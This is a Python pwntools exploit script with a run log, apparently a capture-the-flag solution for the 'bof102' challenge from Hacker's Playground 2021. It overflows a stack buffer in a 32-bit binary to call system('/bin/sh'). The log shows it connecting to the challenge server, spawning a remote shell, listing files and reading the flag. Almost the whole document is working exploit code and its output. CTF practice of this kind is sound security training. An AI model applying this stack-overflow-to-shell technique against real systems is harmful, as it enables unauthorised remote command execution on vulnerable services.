from pwn import *

#context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './bof102'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "bof102.sstf.site"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("Name > ")
s.sendline("/bin/sh")

s.recvuntil(" > ")

buf  = "A"*20
buf += p32(elf.plt.system)
buf += "B"*4
buf += p32(elf.sym.name)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Hacker's_Playground_2021/Pwn_BOF_102$ python solve.py r
[*] "/home/mito/CTF/Hacker's_Playground_2021/Pwn_BOF_102/bof102"
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to bof102.sstf.site on port 1337: Done
[*] Switching to interactive mode
$ id
/bin/sh: 1: id: not found
$ ls -l
total 40
-rwxrwxr-x 1 0 0  466 Jul  2 02:50 Makefile
drwxrwxr-x 1 0 0 4096 Aug 10 04:57 bin
-rwxrwxr-x 1 0 0 7588 Jul  2 02:50 bof102
-rwxrwxr-x 1 0 0  432 Jul  1 07:31 bof102.c
-rwxrwxr-x 1 0 0  422 Jul  1 10:38 check.py
-rwxrwxr-x 1 0 0  687 Jul  1 22:50 ex.py
-rwxrwxr-x 1 0 0   34 Aug 16 06:18 flag
drwxrwxr-x 1 0 0 4096 Aug 10 04:57 lib
drwxrwxr-x 1 0 0 4096 Aug 10 04:58 lib64
$ cat flag
SCTF{B0F_A774ck_w1Th_arg5_1n_x86}
'''
